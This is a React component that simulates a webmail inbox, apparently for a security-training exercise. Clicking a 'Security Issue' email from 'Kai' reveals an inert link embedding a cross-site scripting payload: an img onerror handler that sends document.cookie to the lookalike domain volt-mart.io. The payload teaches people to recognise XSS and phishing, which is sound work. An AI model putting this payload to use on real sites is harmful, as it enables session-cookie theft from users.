import { useState } from 'react'
import { Search, Settings, ChevronLeft, ChevronRight, RefreshCw, Star, Shield, Forward, MessageSquare, Trash2 } from 'lucide-react'
import { FOLDERS, LABELS, LIVEMAIL_BRAND_COLOR } from '../../../../data/emailFixtures'

interface Props { onComplete: () => void; pageCompleted: boolean }

const EMAILS = [
  { from: 'Kai', subject: 'Security Issue', preview: '', date: 'Oct 22', unread: true, isTarget: true },
  { from: 'Me, Heidi (3)', subject: 'Updated images for website', preview: 'Gotcha. I\'m...', date: 'Oct 22', unread: false, isTarget: false },
  { from: 'Lalida', subject: 'Research report available', preview: 'Sharing out the...', date: 'Oct 22', unread: false, isTarget: false },
  { from: 'Natasha', subject: 'Working from home until lunch', preview: 'Need to...', date: 'Oct 22', unread: false, isTarget: false },
  { from: 'Aaron', subject: 'Need volunteers for internal study today', preview: '', date: 'Oct 22', unread: false, isTarget: false },
  { from: 'Andrew, Jacob (5)', subject: 'Quarterly All-Hands', preview: 'Thank you so much...', date: 'Oct 22', unread: false, isTarget: false },
  { from: 'Dawn', subject: 'Missing data for weekly graphs', preview: 'Could you...', date: 'Oct 22', unread: false, isTarget: false },
  { from: 'Thom', subject: 'Infrastructure for user survey', preview: '', date: 'Oct 22', unread: false, isTarget: false },
  { from: 'Lalida, me, Jessica (7)', subject: 'Research report WIP', preview: 'You can...', date: 'Oct 22', unread: false, isTarget: false },
  { from: 'Cameron', subject: 'Quarterly product vitals', preview: 'A...', date: 'Oct 22', unread: false, isTarget: false },
  { from: 'HR Benefits', subject: 'October statement now a', preview: '', date: 'Oct 22', unread: false, isTarget: false },
]

export default function EmailInbox({ onComplete, pageCompleted }: Props) {
  const [clicked, setClicked] = useState(false)

  const handleEmailClick = (isTarget: boolean) => {
    if (isTarget) {
      setClicked(true)
      onComplete()
    }
  }

  return (
    <div className="h-full flex flex-col bg-white overflow-hidden">
      {/* URL bar */}
      <div className="bg-slate-100 border-b border-[var(--color-border)] px-4 py-1.5 shrink-0">
        <div className="flex items-center gap-2 bg-white border border-[var(--color-border)] rounded px-2.5 py-1 text-xs font-mono text-[var(--color-text-secondary)] max-w-xl">
          <Shield size={11} className="text-[var(--color-success)] shrink-0" />
          https://mail.livemail.com/mail/u/0/#inbox
        </div>
      </div>

      {/* LiveMail header */}
      <div className="bg-[#0ea5e9] px-5 py-3 flex items-center justify-between shrink-0">
        <div className="flex items-center gap-2">
          <span className="text-white text-xl">✉️</span>
          <span className="text-white font-bold text-lg">LiveMail</span>
        </div>
        <div className="flex items-center gap-3">
          <Search size={16} className="text-white/80" />
          <span className="text-white/80">🌐</span>
          <div className="w-7 h-7 rounded-full bg-purple-200 flex items-center justify-center text-xs font-bold text-purple-700">PA</div>
          <span className="text-white text-sm">Priya ▾</span>
        </div>
      </div>

      {/* Body */}
      <div className="flex flex-1 overflow-hidden">
        {/* Sidebar */}
        <div className="w-44 border-r border-[var(--color-border)] p-3 shrink-0 overflow-auto">
          <button className="w-full bg-[#84cc16] hover:bg-[#65a30d] text-white text-sm font-semibold py-2 rounded mb-4 transition">
            COMPOSE
          </button>
          <div className="space-y-0.5">
            {FOLDERS.map(f => (
              <div key={f.name} className="flex items-center justify-between px-2 py-1.5 rounded text-sm hover:bg-slate-50 cursor-pointer transition">
                <span className={f.name === 'Inbox' ? 'text-[#0ea5e9] font-medium' : 'text-[var(--color-text-secondary)]'}>{f.name}</span>
                {f.count && <span className="text-xs text-[#0ea5e9]">({f.count})</span>}
              </div>
            ))}
          </div>
          <div className="border-t border-[var(--color-border)] mt-3 pt-3 space-y-0.5">
            {LABELS.map(l => (
              <div key={l} className="px-2 py-1.5 text-sm text-[var(--color-text-secondary)] hover:bg-slate-50 rounded cursor-pointer transition">
                {l}
              </div>
            ))}
          </div>
        </div>

        {/* Email list */}
        <div className="flex-1 overflow-auto">
          {/* Toolbar */}
          <div className="flex items-center gap-3 px-4 py-2 border-b border-[var(--color-border)] text-[var(--color-text-muted)]">
            <input type="checkbox" className="w-3.5 h-3.5 rounded" />
            <RefreshCw size={14} />
            <span className="text-sm">More ▾</span>
            <div className="ml-auto flex items-center gap-2">
              <ChevronLeft size={14} />
              <ChevronRight size={14} />
              <Settings size={14} />
            </div>
          </div>

          {/* Emails or Email Content */}
          {!clicked ? (
            <div>
              {EMAILS.map((email, i) => (
                <div
                  key={i}
                  id={email.isTarget ? 'target-email' : undefined}
                  onClick={() => handleEmailClick(email.isTarget)}
                  className={`flex items-center gap-3 px-4 py-2.5 border-b border-slate-100 cursor-pointer transition ${
                    email.isTarget
                      ? 'bg-[#84cc16]/10 hover:bg-[#84cc16]/20 border-l-2 border-l-[#84cc16]'
                      : 'hover:bg-slate-50'
                  } ${email.unread ? 'bg-white' : ''}`}
                >
                  <input type="checkbox" className="w-3.5 h-3.5 rounded shrink-0" />
                  <Star size={14} className="text-slate-300 shrink-0" />
                  <span className={`w-36 truncate text-sm shrink-0 ${
                    email.unread ? 'font-bold text-[var(--color-text-primary)]' : 'text-[var(--color-text-secondary)]'
                  }`}>
                    {email.from}
                  </span>
                  <div className="flex-1 flex items-center gap-1 min-w-0">
                    <span className={`truncate text-sm ${
                      email.unread ? 'font-semibold text-[var(--color-text-primary)]' : 'text-[var(--color-text-secondary)]'
                    }`}>
                      {email.subject}
                    </span>
                    {email.preview && (
                      <span className="text-sm text-[var(--color-text-muted)] truncate"> - {email.preview}</span>
                    )}
                  </div>
                  <span className="text-xs text-[var(--color-text-muted)] shrink-0">{email.date}</span>
                </div>
              ))}
            </div>
          ) : (
            <div className="flex-1 flex flex-col animate-fade-in">
              <div className="border-b border-[var(--color-border)] px-6 py-4">
                <div className="flex items-center justify-between mb-3">
                  <h2 className="text-lg font-semibold text-[var(--color-text-primary)]">Security Issue</h2>
                  <span className="text-xs text-[var(--color-text-muted)] bg-slate-100 px-2 py-0.5 rounded border border-[var(--color-border)]">Inbox</span>
                </div>
                <div className="bg-slate-50 rounded px-3 py-2 mb-2">
                  <span className="text-sm text-[var(--color-text-muted)]">From: </span>
                  <span className="text-sm text-[var(--color-text-secondary)]">Kai</span>
                </div>
                <div className="mb-2">
                  <span className="text-sm font-semibold text-[var(--color-text-primary)]">Subject: Security Issue</span>
                </div>
                <div className="flex items-center gap-2 text-[var(--color-text-muted)]">
                  <Star size={14} />
                  <Forward size={14} />
                  <MessageSquare size={14} />
                  <Trash2 size={14} />
                </div>
              </div>

              <div className="px-8 py-6 space-y-4 text-sm text-[var(--color-text-secondary)] leading-relaxed">
                <p>Hi Priya,</p>
                <p>
                  I took a first pass at testing VoltMart's latest release and found something interesting
                  at the product web page.
                </p>
                <p>It's best you take a look at it for yourself,</p>
                <p>Regards,</p>
                <p>Kai</p>

                <div className="mt-6 pt-4 border-t border-[var(--color-border)]">
                  <a
                    href="#"
                    onClick={e => e.preventDefault()}
                    className="text-blue-600 hover:text-blue-700 text-sm break-all underline font-mono leading-relaxed opacity-70 cursor-default"
                  >
                    https://voltmart.io/p/products/ultrabook-pro-x1#glideview/0,&lt;img src=x onerror=javascript:window.open('http://volt-mart.io?sid='+document.cookie)&gt;/
                  </a>
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}
